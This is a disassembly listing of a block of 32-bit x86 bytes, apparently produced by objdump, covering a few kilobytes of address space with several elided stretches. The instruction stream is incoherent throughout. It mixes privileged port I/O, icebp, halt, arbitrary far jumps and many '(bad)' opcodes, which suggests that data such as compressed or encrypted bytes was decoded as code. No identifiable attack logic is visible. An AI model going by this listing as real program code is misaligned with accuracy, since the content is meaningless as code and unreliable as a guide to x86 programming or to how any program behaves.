  41698c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41698d:	lea    edi,[edi-0x1351460f]
  416993:	and    al,0x67
  416995:	and    dh,BYTE PTR ds:0xc8263af0
  41699b:	outs   dx,DWORD PTR ds:[esi]
  41699c:	lea    eax,[ebx]
  41699e:	and    BYTE PTR [eax-0x2f659b4c],dl
  4169a4:	or     al,0xdd
  4169a6:	mov    ebx,0x8ed87abd
  4169ab:	sbb    bl,BYTE PTR [ebx]
  4169ad:	imul   esi,DWORD PTR [ecx-0x7a],0x4437a3d
  4169b4:	out    dx,eax
  4169b5:	xchg   ecx,eax
  4169b6:	jmp    FWORD PTR [edi-0x3c]
  4169b9:	cmp    BYTE PTR [esp+eiz*8+0x61d85103],ch
  4169c0:	jge    0x416969
  4169c2:	pusha  
  4169c3:	mov    eax,ds:0xccd5da15
  4169c8:	mov    esp,0x312d5d72
  4169cd:	mov    edx,0xa9453fea
  4169d2:	mov    edi,0x1b8e5e64
  4169d7:	pop    ecx
  4169d8:	jl     0x416a0e
  4169da:	iret   
  4169db:	jns    0x41698e
  4169dd:	push   ebx
  4169de:	cdq    
  4169df:	jbe    0x4169b7
  4169e1:	and    BYTE PTR [esi+0x25],cl
  4169e4:	cmp    ah,BYTE PTR [ecx-0x53]
  4169e7:	xor    ebx,esp
  4169e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169ea:	jnp    0x4169dd
  4169ec:	add    dh,dl
  4169ee:	pop    ebp
  4169ef:	mov    bh,0x45
  4169f1:	retf   
  4169f2:	call   0xe4e9:0xbc07be8a
  4169f9:	fimul  WORD PTR [ebx]
  4169fb:	dec    esi
  4169fc:	or     dh,BYTE PTR [ebp-0x5f]
  4169ff:	pop    ecx
  416a00:	mov    bl,BYTE PTR [edx-0xd020714]
  416a06:	(bad)  
  416a07:	cld    
  416a08:	cdq    
  416a09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a0a:	ficomp WORD PTR [ecx-0x28947c74]
  416a10:	and    DWORD PTR [ebx],eax
  416a12:	fist   DWORD PTR [esp+eax*4-0x64]
  416a16:	cld    
  416a17:	xor    al,0x12
  416a19:	dec    ebp
  416a1b:	sbb    eax,0xcee06d47
  416a20:	add    bh,ah
  416a22:	xlat   BYTE PTR ds:[ebx]
  416a23:	ins    BYTE PTR es:[edi],dx
  416a24:	out    dx,al
  416a25:	(bad)  
  416a26:	adc    al,0xdc
  416a28:	push   eax
  416a29:	hlt    
  416a2a:	jb     0x416a9e
  416a2c:	ja     0x416a45
  416a2e:	les    esp,FWORD PTR [eax+0x3e92bed7]
  416a34:	(bad)  
  416a35:	pop    eax
  416a36:	icebp  
  416a37:	dec    eax
  416a38:	sar    cl,cl
  416a3a:	xchg   esi,eax
  416a3b:	mov    ebx,0x120eba1d
  416a40:	dec    ecx
  416a41:	ins    DWORD PTR es:[edi],dx
	...
  416ab2:	add    BYTE PTR [eax],al
  416ab4:	fistp  QWORD PTR [esi-0x449a6dfb]
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx-0x4440b4ae]
  416ac3:	add    cl,dh
  416ac5:	test   DWORD PTR [eax],0xf600
  416acb:	add    BYTE PTR [edi+0x4c3d8805],bh
  416ad1:	mov    al,0x38
  416ad3:	out    dx,eax
  416ad4:	adc    ebp,eax
  416ad6:	inc    esi
  416ad7:	sub    DWORD PTR [edi],edx
  416ad9:	in     al,dx
  416ada:	sbb    cl,dh
  416adc:	push   ebp
  416add:	jae    0x416b3c
  416adf:	and    cl,BYTE PTR [edx+edi*2]
  416ae2:	xor    dl,BYTE PTR ds:0xb4cd438c
  416ae8:	les    ecx,FWORD PTR [ebp-0x7497bcf0]
  416aee:	inc    esi
  416aef:	fist   DWORD PTR [eax]
  416af1:	pushf  
  416af2:	nop
  416af3:	sub    eax,0x7cff11ef
  416af8:	ret    0x8fc2
  416afb:	fsub   DWORD PTR [ecx+eiz*1-0x68]
  416aff:	pop    es
  416b00:	pop    edi
  416b01:	clc    
  416b02:	data16 stos BYTE PTR es:[edi],al
  416b04:	shl    BYTE PTR [ebx],1
  416b06:	rol    ah,1
  416b08:	add    esp,DWORD PTR [edx]
  416b0a:	mov    WORD PTR [eax+0x4a],cs
  416b0d:	jno    0x416b1b
  416b0f:	lds    ebp,FWORD PTR [edi]
  416b11:	sbb    BYTE PTR [esi+edx*1],dh
  416b14:	xchg   DWORD PTR [ebp-0x63bfd20f],esi
  416b1a:	dec    ebx
  416b1b:	in     al,dx
  416b1c:	or     bl,BYTE PTR [esi+ebx*2-0x5f63013b]
  416b23:	sahf   
  416b24:	sbb    BYTE PTR [edx+0x73],dh
  416b27:	inc    ebx
  416b28:	(bad)  
  416b29:	xlat   BYTE PTR ds:[ebx]
  416b2a:	jl     0x416ba2
  416b2c:	retf   
  416b2d:	mov    edx,DWORD PTR ds:0xa6298539
  416b33:	hlt    
  416b34:	test   al,0xa
  416b36:	pusha  
  416b37:	or     DWORD PTR [ebp-0x1e],edi
  416b3a:	cmp    DWORD PTR [edx],edi
  416b3c:	xor    al,0x5f
  416b3e:	fstp   st(7)
  416b40:	and    eax,DWORD PTR [eax+eax*8-0x78]
  416b44:	xchg   edi,ebx
  416b46:	push   edx
  416b47:	mov    WORD PTR [edx],gs
  416b49:	pop    ebp
  416b4a:	xor    cl,BYTE PTR [edi-0x53]
  416b4d:	(bad)  
  416b4e:	xchg   edi,eax
  416b4f:	loope  0x416b53
  416b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b52:	dec    ebx
  416b53:	cmc    
  416b54:	or     edi,0xdbd917ae
  416b5a:	sbb    ch,dl
  416b5c:	add    eax,0x6bb6f7d6
  416b61:	jae    0x416ba7
  416b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b64:	enter  0x43b3,0x30
  416b68:	in     eax,dx
  416b69:	sahf   
  416b6a:	repnz push es
  416b6c:	imul   ebx,DWORD PTR [esi-0x20c50f2a],0x7f32bcd1
  416b76:	cmp    al,0x36
  416b78:	mov    bl,0x26
  416b7a:	inc    eax
  416b7b:	mov    fs:0x25f39d5a,al
  416b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b82:	jne    0x416bd8
  416b84:	push   es
  416b85:	inc    eax
  416b86:	js     0x416b4b
  416b88:	shl    BYTE PTR [esi],0x61
  416b8b:	lods   eax,DWORD PTR ds:[esi]
  416b8c:	sub    eax,0x30eef0f1
  416b91:	and    dl,0xba
  416b94:	sbb    al,0x52
  416b96:	lods   al,BYTE PTR ds:[esi]
  416b97:	and    BYTE PTR [ebx-0x5e18faff],bh
  416b9d:	mov    al,BYTE PTR [edi+0x5b]
  416ba0:	jmp    0x1430:0x14804092
  416ba7:	into   
  416ba8:	fldenv [edi+edx*2-0x61]
  416bac:	clc    
  416bad:	rcl    edx,0xe1
  416bb0:	sbb    ah,BYTE PTR [esi+0x5e]
  416bb3:	fs push ecx
  416bb5:	fwait
  416bb6:	mov    esi,0xc19eaa8f
  416bbb:	arpl   si,sp
  416bbd:	lds    ebp,FWORD PTR [edi]
  416bbf:	mov    cl,0xdd
  416bc1:	pop    ss
	...
  416c32:	add    BYTE PTR [eax],al
  416c34:	cmp    dl,BYTE PTR [eax]
  416c36:	mov    edi,0xbbbfbf3c
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    ecx,DWORD PTR [edi-0xf]
  416c42:	push   edi
  416c43:	or     eax,0xf8c4
  416c48:	test   BYTE PTR [eax],0x0
  416c4b:	add    BYTE PTR [edx-0x52ec9006],cl
  416c51:	adc    ecx,DWORD PTR [edx-0x15]
  416c54:	cld    
  416c55:	outs   dx,DWORD PTR ds:[esi]
  416c56:	pop    ebp
  416c57:	mov    cl,0xf
  416c59:	ins    BYTE PTR es:[edi],dx
  416c5a:	cld    
  416c5b:	adc    DWORD PTR [eax-0x2a],esi
  416c5e:	jbe    0x416c16
  416c60:	and    BYTE PTR [edi-0x497ad69f],dl
  416c66:	fld    QWORD PTR [edi+0xb]
  416c69:	xor    eax,0xa3744c22
  416c6e:	loop   0x416ce4
  416c70:	mov    ds:0x9bdbe247,al
  416c75:	pop    ebx
  416c76:	jno    0x416cf4
  416c78:	and    esi,DWORD PTR [edi+0x45631d4c]
  416c7e:	icebp  
  416c7f:	das    
  416c80:	xor    BYTE PTR [edi+ecx*8-0x56],bh
  416c84:	push   0xa3bba3ea
  416c89:	rcr    BYTE PTR [esi+0xd],0x55
  416c8d:	bound  esp,QWORD PTR [edi+0xc]
  416c90:	jnp    0x416c48
  416c92:	retf   0x231a
  416c95:	adc    eax,DWORD PTR [ecx-0x4a8e4c06]
  416c9b:	sahf   
  416c9c:	call   0xfb76eb2b
  416ca1:	inc    edx
  416ca2:	jge    0x416c6a
  416ca4:	retf   
  416ca5:	add    eax,0xb5fbfe15
  416caa:	push   0x2
  416cac:	les    ebx,FWORD PTR [ebx+0xe]
  416caf:	imul   esi,esp,0xfaa91f39
  416cb5:	and    ch,0x4
  416cb8:	or     edi,ebx
  416cba:	xchg   ebp,eax
  416cbb:	mov    eax,0x9092c24c
  416cc0:	sbb    bh,al
  416cc2:	iret   
  416cc3:	dec    edx
  416cc4:	or     cl,dl
  416cc6:	push   0x751587e7
  416ccb:	sti    
  416ccc:	sbb    bl,BYTE PTR [eax-0x2d3f9922]
  416cd2:	mov    ebx,DWORD PTR [ebp-0x56]
  416cd5:	outs   dx,BYTE PTR ds:[esi]
  416cd6:	or     al,0xac
  416cd8:	sbb    DWORD PTR [edx+0x65],edx
  416cdb:	(bad)  
  416cdc:	push   esp
  416cdd:	xchg   edi,esi
  416cdf:	push   0x68c83cf4
  416ce4:	aam    0x2e
  416ce6:	jmp    0xe6:0x2d72c453
  416ced:	hlt    
  416cee:	in     al,0xec
  416cf0:	inc    esi
  416cf1:	push   ds
  416cf2:	jl     0x416d48
  416cf4:	sub    ecx,DWORD PTR [edx+0x264ebecb]
  416cfa:	pop    ebx
  416cfb:	ficomp WORD PTR [ecx+0x40]
  416cfe:	(bad)  
  416cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d00:	push   cs
  416d01:	add    eax,0x635861d7
  416d06:	div    bl
  416d08:	mov    dl,0xe2
  416d0a:	lds    edx,FWORD PTR [edi+0x4f509191]
  416d10:	aam    0xd0
  416d12:	lea    edi,[ecx+ecx*1-0x4f82fe2]
  416d19:	push   0x2e8c62ee
  416d1e:	mov    bh,0x8f
  416d20:	leave  
  416d21:	adc    al,0xd0
  416d23:	mov    cl,0xf3
  416d25:	imul   cx,ax,0x4def
  416d2a:	in     eax,0xd8
  416d2c:	xchg   edi,eax
  416d2d:	xchg   edi,eax
  416d2e:	inc    ebp
  416d2f:	mov    esi,0xb79d699b
  416d34:	adc    cl,BYTE PTR [eax+0x59]
  416d37:	mov    WORD PTR [eax+0x50],fs
  416d3a:	cmp    edx,DWORD PTR [eax+0x59]
  416d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d3e:	xchg   ecx,eax
  416d3f:	cmp    ecx,edi
  416d41:	ret    0x0
	...
  416db4:	out    dx,al
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0x557812e7
  416dc4:	mov    edx,0xf60000f9
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR [ebx-0x64a87946],bl
  416dd1:	fcmovbe st,st(3)
  416dd3:	out    0x4e,eax
  416dd5:	fs or  eax,0x51bb966a
  416ddb:	popa   
  416ddc:	int3   
  416ddd:	xchg   BYTE PTR [ecx],dl
  416ddf:	push   ebx
  416de0:	sbb    dh,dl
  416de2:	xchg   ebx,eax
  416de3:	pop    DWORD PTR [esi]
  416de5:	in     eax,dx
  416de6:	into   
  416de7:	(bad)  
  416de8:	adc    DWORD PTR [edx],ebp
  416dea:	aaa    
  416deb:	ror    BYTE PTR [ecx],cl
  416ded:	add    eax,0xc9942997
  416df2:	imul   ebp,DWORD PTR [ebp-0x5ff28aad],0xa717805d
  416dfc:	mov    ds:0x377838be,al
  416e01:	stc    
  416e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e03:	push   ebp
  416e04:	and    DWORD PTR [edi+0x50],edx
  416e07:	mov    eax,ds:0x3b34da21
  416e0c:	addr16 repnz leave 
  416e0f:	mov    cl,0x49
  416e11:	adc    DWORD PTR [esi-0x23],esi
  416e14:	add    al,0xb3
  416e16:	inc    ebx
  416e17:	bound  esi,QWORD PTR [ebx-0x1d]
  416e1a:	es jmp 0x2d6e:0xb2bc027a
  416e22:	fidivr DWORD PTR [ebp-0x19]
  416e25:	mov    al,ds:0xcc7329eb
  416e2a:	fadd   QWORD PTR [esi]
  416e2c:	(bad)  
  416e2d:	mov    dh,0x4e
  416e2f:	push   ebp
  416e30:	push   es
  416e31:	and    ch,BYTE PTR [edi]
  416e33:	(bad)  
  416e34:	mov    edi,0x90afa1a9
  416e39:	pop    ebx
  416e3a:	mov    dl,bh
  416e3c:	adc    BYTE PTR [ecx-0x27],bh
  416e3f:	jnp    0x416df4
  416e41:	not    edx
  416e43:	push   ebp
  416e44:	bound  esi,QWORD PTR [ebp+0x47]
  416e47:	shr    BYTE PTR [ebx+ecx*8+0x22d06892],1
  416e4e:	sub    DWORD PTR [eax-0x4],esp
  416e51:	adc    al,0xc8
  416e53:	bound  edx,QWORD PTR [ecx]
  416e55:	jge    0x416ec3
  416e57:	cdq    
  416e58:	push   edx
  416e59:	jne    0x416df6
  416e5b:	jecxz  0x416e98
  416e5d:	lods   eax,DWORD PTR ds:[esi]
  416e5e:	xor    bl,BYTE PTR [esp+edi*8+0x29df1c95]
  416e65:	dec    ecx
  416e66:	mov    ah,0x52
  416e68:	and    eax,0xdcce469f
  416e6d:	dec    ecx
  416e6e:	loope  0x416df4
  416e70:	adc    BYTE PTR [ebx-0x77],bl
  416e73:	retf   0x99a1
  416e76:	pop    eax
  416e77:	xchg   ebp,eax
  416e78:	cmp    ebx,edi
  416e7a:	add    dh,BYTE PTR [edx+0x5b7fbb6e]
  416e80:	dec    esp
  416e81:	pop    edi
  416e82:	in     eax,dx
  416e83:	dec    eax
  416e84:	jg     0x416e35
  416e86:	push   ebp
  416e87:	(bad)  
  416e88:	mov    ch,0x92
  416e8a:	pop    es
  416e8b:	scas   eax,DWORD PTR es:[edi]
  416e8c:	adc    eax,0x880929dc
  416e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e92:	jns    0x416efc
  416e94:	or     eax,0x4b5ba4e0
  416e99:	nop    DWORD PTR [eax-0x56]
  416e9d:	(bad)  
  416e9e:	retf   0x1967
  416ea1:	std    
  416ea2:	daa    
  416ea3:	(bad)
  416ea6:	xchg   ebx,eax
  416ea7:	cld    
  416ea8:	cmp    DWORD PTR [esi-0x60753c55],0x1f
  416eaf:	dec    edi
  416eb0:	stos   DWORD PTR es:[edi],eax
  416eb1:	ins    BYTE PTR es:[edi],dx
  416eb2:	mov    edi,esi
  416eb4:	push   ecx
  416eb5:	mov    bl,BYTE PTR [edi]
  416eb7:	and    DWORD PTR [ebp-0x1a],ebp
  416eba:	push   edx
  416ebb:	std    
  416ebc:	in     eax,0xfa
  416ebe:	lock retf 
  416ec0:	aam    0xf2
	...
  416f32:	add    BYTE PTR [eax],al
  416f34:	pop    ss
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	call   0xb10c05ff
  416f45:	cli    
  416f46:	add    BYTE PTR [eax],al
  416f48:	test   BYTE PTR [eax],0x0
  416f4b:	add    bh,bh
  416f4d:	dec    ebp
  416f4e:	jo     0x416eee
  416f50:	iret   
  416f51:	jae    0x416fac
  416f53:	ja     0x416eec
  416f55:	pushw  0x52ab
  416f59:	inc    ecx
  416f5a:	and    BYTE PTR [edi+edi*4+0x53],dl
  416f5e:	rcr    BYTE PTR [esi],1
  416f60:	jbe    0x416f49
  416f62:	dec    eax
  416f63:	jp     0x416f7e
  416f65:	lock enter 0x9707,0x5e
  416f6a:	int    0xa1
  416f6c:	lea    esp,[ebx]
  416f6e:	push   ss
  416f6f:	mov    cl,0xf7
  416f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f72:	sbb    cl,ah
  416f74:	adc    dh,cl
  416f76:	or     BYTE PTR [esi+0x3f745649],ch
  416f7c:	fistp  DWORD PTR [edi]
  416f7e:	retf   
  416f7f:	jge    0x416fb0
  416f81:	sbb    esp,DWORD PTR [edx+0x48976f5d]
  416f87:	out    0x76,al
  416f89:	fidiv  WORD PTR [edi-0x6418f154]
  416f8f:	xchg   esp,eax
  416f90:	xor    eax,0xaf97cb37
  416f95:	push   edx
  416f96:	std    
  416f97:	pushf  
  416f98:	enter  0xf954,0xc7
  416f9c:	xchg   ebx,eax
  416f9d:	jo     0x41701e
  416f9f:	mov    ch,al
  416fa1:	or     eax,0x5a670dc
  416fa6:	xor    edi,DWORD PTR [ebx-0x17]
  416fa9:	jo     0x416fd0
  416fab:	fucomip st,st(0)
  416fad:	pop    eax
  416fae:	ss cmp al,0x53
  416fb1:	out    dx,al
  416fb2:	outs   dx,DWORD PTR ds:[esi]
  416fb3:	popf   
  416fb4:	or     BYTE PTR [ebx-0x8],ch
  416fb7:	inc    esp
  416fb8:	inc    edx
  416fb9:	out    0x7b,eax
  416fbb:	lods   al,BYTE PTR ds:[esi]
  416fbc:	adc    esp,DWORD PTR [eax]
  416fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fbf:	and    bh,dl
  416fc1:	pop    ebp
  416fc2:	mov    eax,0xb5550d35
  416fc7:	mov    cl,0x1a
  416fc9:	(bad)  
  416fca:	shr    BYTE PTR [esi-0x3449e7fd],1
  416fd0:	mov    esp,0x83620f4
  416fd5:	push   eax
  416fd6:	lds    eax,FWORD PTR ds:0xfb299e15
  416fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fdd:	rcl    DWORD PTR [ebx],cl
  416fdf:	sub    eax,0x44ad91a1
  416fe4:	xchg   edx,eax
  416fe5:	test   BYTE PTR [edi-0x7117539a],0x5a
  416fec:	xor    eax,DWORD PTR [esi+0x39]
  416fef:	jle    0x416ff2
  416ff1:	fistp  DWORD PTR [esi-0x28]
  416ff4:	or     ecx,ecx
  416ff6:	into   
  416ff7:	test   BYTE PTR [edi],ah
  416ff9:	es nop
  416ffb:	out    dx,eax
  416ffc:	int    0x7c
  416ffe:	lahf   
  416fff:	mov    dh,0xb2
  417001:	cs sbb al,0xc1
  417004:	(bad)  
  417006:	lds    ecx,FWORD PTR [edx]
  417008:	push   edx
  417009:	pop    es
  41700a:	and    DWORD PTR [esi-0x2],edi
  41700d:	out    0xad,eax
  41700f:	pop    ebp
  417010:	or     al,ah
  417012:	jp     0x41707f
  417014:	out    dx,al
  417015:	ins    DWORD PTR es:[edi],dx
  417016:	mov    dl,0x32
  417018:	cmp    al,0x61
  41701a:	dec    ebx
  41701b:	sbb    bh,al
  41701d:	dec    edi
  41701e:	fistp  WORD PTR [esi+0x285d1afc]
  417024:	jb     0x417047
  417026:	pop    es
  417027:	pushf  
  417028:	mov    bl,BYTE PTR [ebx+0x34]
  41702b:	xchg   esi,eax
  41702c:	imul   esp,DWORD PTR [ebp+0x7c],0xffffffc6
  417030:	dec    edi
  417031:	or     eax,0xdde99881
  417036:	pusha  
  417037:	add    al,0x35
  417039:	push   0x14
  41703b:	cmp    ebx,esi
  41703d:	mov    ebp,0x3eea93
	...
  4170b3:	add    BYTE PTR [eax],ah
  4170b5:	jmp    0xdf3d4ef5
  4170ba:	in     eax,0xff
  4170bc:	dec    ecx
  4170bd:	dec    ecx
  4170be:	ret    
  4170bf:	xor    eax,0xffffffab
  4170c2:	es sub eax,0xfba6
  4170c8:	test   BYTE PTR [eax],0x0
  4170cb:	add    BYTE PTR [ebx-0x7],al
  4170ce:	popa   
  4170cf:	psraw  mm2,QWORD PTR [ebx-0x3835f9a6]
  4170d6:	jmp    0x116f36fa
  4170db:	cmp    DWORD PTR [edx+0x6e6682ee],edi
  4170e1:	pushf  
  4170e2:	add    esi,ecx
  4170e4:	push   ds
  4170e5:	jl     0x4170cc
  4170e7:	outs   dx,DWORD PTR ds:[esi]
  4170e8:	push   edx
  4170e9:	sub    eax,0x7b0ff37e
  4170ee:	pop    esp
  4170ef:	sbb    eax,0xb5b8bfd
  4170f4:	adc    DWORD PTR [eax-0x48eabc4f],0x1a
  4170fb:	es in  al,dx
  4170fd:	mov    al,dh
  4170ff:	outs   dx,DWORD PTR ds:[esi]
  417100:	pop    edx
  417101:	pushf  
  417102:	pop    esp
  417103:	xchg   ebp,eax
  417104:	sbb    al,0xd6
  417106:	add    al,0x69
  417108:	push   ecx
  417109:	(bad)  
  41710a:	icebp  
  41710b:	mov    esi,0x430fd1bf
  417110:	sbb    edi,DWORD PTR [edx-0x4fc26467]
  417116:	mov    ch,0x16
  417118:	sub    BYTE PTR [eax-0x185dd03f],dl
  41711e:	stos   BYTE PTR es:[edi],al
  41711f:	push   0xbedcdec8
  417124:	jae    0x41714a
  417126:	addr16 or al,0xd8
  417129:	xchg   esp,esi
  41712b:	xchg   edx,eax
  41712c:	pop    esp
  41712d:	mov    WORD PTR [edi],fs
  41712f:	stos   DWORD PTR es:[edi],eax
  417130:	inc    eax
  417131:	xor    ch,cl
  417133:	adc    al,0xdd
  417135:	test   eax,0x33c89e3d
  41713a:	mov    ebx,0xd4418324
  41713f:	mov    al,ds:0x408491a3
  417144:	sti    
  417145:	cmc    
  417146:	test   dl,dh
  417148:	cs call 0x9682e333
  41714e:	push   edi
  41714f:	call   0xacc3:0xd36acde1
  417156:	add    eax,0x2ed9d13e
  41715c:	push   eax
  41715d:	inc    ebp
  41715e:	add    eax,0x45b5e3c9
  417163:	loope  0x4170f4
  417165:	inc    ecx
  417166:	add    DWORD PTR [esi+0x46],eax
  417169:	bound  esp,QWORD PTR [ebx]
  41716b:	push   cs
  41716c:	mov    ds:0xced9c881,eax
  417171:	add    ebx,DWORD PTR [esi]
  417173:	dec    esp
  417174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417175:	fisttp WORD PTR [esi+0x27d3090a]
  41717b:	or     BYTE PTR [ebx+ecx*2-0x4d11318c],bh
  417182:	jo     0x417146
  417184:	lock js 0x417142
  417187:	jo     0x4171bc
  417189:	cmp    al,0x6e
  41718b:	xchg   edi,eax
  41718c:	jg     0x417157
  41718e:	pop    esp
  41718f:	hlt    
  417190:	mov    ch,0x66
  417192:	or     eax,0xf047a307
  417197:	dec    eax
  417198:	neg    DWORD PTR [ecx-0x70397820]
  41719e:	jecxz  0x4171fe
  4171a0:	pop    ecx
  4171a1:	sbb    dh,cl
  4171a3:	fst    QWORD PTR [eax-0x3be99d08]
  4171a9:	fcom   st(1)
  4171ab:	dec    edx
  4171ac:	and    dl,BYTE PTR [eax-0x594abec6]
  4171b2:	mov    ds:0x84f96e82,al
  4171b7:	jp     0x4171cd
  4171b9:	popf   
  4171ba:	push   ebx
  4171bb:	pop    edx
  4171bc:	daa    
  4171bd:	jo     0x417231
  4171bf:	adc    eax,0x78a8
	...
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	stos   WORD PTR es:[edi],ax
  417241:	les    ebp,FWORD PTR [ebx-0x1e]
  417244:	pushf  
  417245:	cld    
  417246:	add    BYTE PTR [eax],al
  417248:	test   BYTE PTR [eax],0x0
  41724b:	add    ah,ch
  41724d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41724e:	(bad)  
  41724f:	mov    eax,ds:0xd9be5cf7
  417254:	cs sub eax,0xe7345ad8
  41725a:	push   ecx
  41725b:	jo     0x417251
  41725d:	aas    
  41725e:	xchg   esp,eax
  41725f:	jmp    0x264f:0x82f16479
  417266:	mov    esp,DWORD PTR cs:[esi]
  417269:	inc    ecx
  41726a:	test   eax,0xdd2507bf
  41726f:	sbb    BYTE PTR [edx],0xfc
  417272:	popf   
  417273:	enter  0x9581,0xdf
  417277:	adc    eax,0xcb49067e
  41727c:	out    dx,al
  41727d:	clc    
  41727e:	mov    edi,0x917fd10e
  417283:	xor    al,0xf2
  417285:	int    0x25
  417287:	scas   al,BYTE PTR es:[edi]
  417288:	and    al,0xcb
  41728a:	ret    
  41728b:	adc    esp,DWORD PTR [ebp-0x713e258e]
  417291:	dec    esi
  417292:	and    ecx,ecx
  417294:	pop    esp
  417295:	push   eax
  417296:	sti    
  417297:	mov    bl,BYTE PTR [eax+0x0]
  41729a:	pop    edi
  41729b:	xchg   edi,eax
  41729c:	lahf   
  41729d:	xchg   edi,eax
  41729e:	or     dl,al
  4172a0:	ds pop eax
  4172a2:	ins    DWORD PTR es:[edi],dx
  4172a3:	jmp    0x2a63:0x82d0449a
  4172aa:	mov    al,0xe8
  4172ac:	or     ecx,DWORD PTR [edi-0x36]
  4172af:	inc    edx
  4172b0:	cwde   
  4172b1:	imul   ebp,DWORD PTR [esi],0x28
  4172b4:	jno    0x41731e
  4172b6:	call   0xa5161774
  4172bb:	add    edx,eax
  4172bd:	and    al,0xa8
  4172bf:	mov    BYTE PTR [esi+esi*4+0x3b6ec7e2],0xfe
  4172c7:	aad    0xfd
  4172c9:	je     0x41727c
  4172cb:	pop    ebp
  4172cc:	icebp  
  4172cd:	stos   DWORD PTR es:[edi],eax
  4172ce:	out    0xe7,al
  4172d0:	and    ebx,edi
  4172d2:	adc    edi,esi
  4172d4:	fs out dx,al
  4172d6:	inc    ebx
  4172d7:	je     0x4172c8
  4172d9:	sub    al,0x1
  4172db:	ds (bad) 
  4172dd:	dec    ebp
  4172de:	and    eax,0x2d4f3f83
  4172e3:	daa    
  4172e4:	mov    esi,0x44d4f16
  4172e9:	jns    0x4172a4
  4172eb:	lahf   
  4172ec:	mov    ebx,0xb86925b4
  4172f1:	xor    DWORD PTR [eax+esi*4],edx
  4172f4:	out    0x76,eax
  4172f6:	adc    ecx,DWORD PTR [esi]
  4172f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172f9:	mov    edx,0xdedf3bc8
  4172fe:	fmulp  st(6),st
  417300:	psrlq  mm0,QWORD PTR [esi]
  417303:	mov    dh,dh
  417305:	in     eax,dx
  417306:	sbb    eax,0xffffffc9
  417309:	std    
  41730a:	dec    esi
  41730b:	and    BYTE PTR [ecx],0x74
  41730e:	cmp    edi,DWORD PTR [esi]
  417310:	mov    dh,cl
  417312:	loope  0x417339
  417314:	sbb    eax,0x53bd8031
  417319:	push   0x1c6e289e
  41731e:	xchg   ecx,ecx
  417320:	std    
  417321:	pop    ebx
  417322:	xor    ah,BYTE PTR [edi]
  417324:	sbb    eax,DWORD PTR [ecx-0x39]
  417327:	and    BYTE PTR [edx],al
  417329:	ins    BYTE PTR es:[edi],dx
  41732a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41732b:	adc    DWORD PTR [edx+0x7a],esi
  41732e:	jo     0x417350
  417330:	dec    eax
  417331:	fs int 0x8a
  417334:	int    0x68
  417336:	cmp    dl,al
  417338:	sub    al,0x83
  41733a:	mov    bh,0xee
  41733c:	inc    ebx
  41733d:	data16 int3 
  41733f:	ret    
  417340:	mov    esp,0xd6
	...
  4173b1:	add    BYTE PTR [eax],al
  4173b3:	add    bl,dh
  4173b5:	inc    ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0xad
  4173c1:	mov    ah,0x7e
  4173c3:	stos   BYTE PTR es:[edi],al
  4173c4:	xchg   edx,eax
  4173c5:	std    
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	test   BYTE PTR [eax],0x0
  4173cb:	add    al,al
  4173cd:	add    al,0x4
  4173cf:	(bad)  
  4173d1:	add    BYTE PTR ds:0x3d015ccc,ch
  4173d7:	shl    BYTE PTR [ebp+0x6bf5a94f],0xee
  4173de:	adc    eax,0xa4d57a7c
  4173e3:	add    BYTE PTR [ebx],0x33
  4173e6:	sbb    ch,BYTE PTR [ebx-0x22]
  4173e9:	xor    al,0x49
  4173eb:	call   0x91b3:0xb8f8db21
  4173f2:	inc    edi
  4173f3:	das    
  4173f4:	pop    edx
  4173f5:	jbe    0x41740a
  4173f7:	icebp  
  4173f8:	adc    DWORD PTR [edx+0x21],edi
  4173fb:	clc    
  4173fc:	cwde   
  4173fd:	loop   0x417468
  4173ff:	(bad)  
  417400:	cmp    eax,0xb5811438
  417405:	xchg   DWORD PTR [esi],ecx
  417407:	scas   al,BYTE PTR es:[edi]
  417408:	jl     0x417484
  41740a:	ins    DWORD PTR es:[edi],dx
  41740b:	and    DWORD PTR [ebx+0x122931bf],ecx
  417411:	sbb    bl,cl
  417413:	jl     0x417430
  417415:	cmp    DWORD PTR [esi-0x52],ebp
  417418:	sahf   
  417419:	add    BYTE PTR [ecx-0x5738b14c],dl
  41741f:	js     0x41743a
  417421:	mov    dh,0x67
  417423:	test   BYTE PTR [edx],ch
  417425:	inc    ebx
  417426:	or     BYTE PTR [eax+0x2b52e884],0x46
  41742d:	inc    edi
  41742e:	leave  
  41742f:	icebp  
  417430:	inc    ecx
  417431:	ret    
  417432:	inc    ecx
  417433:	imul   eax,DWORD PTR [ebx+0x43],0x4c
  417437:	stos   BYTE PTR es:[edi],al
  417438:	jo     0x417460
  41743a:	dec    esi
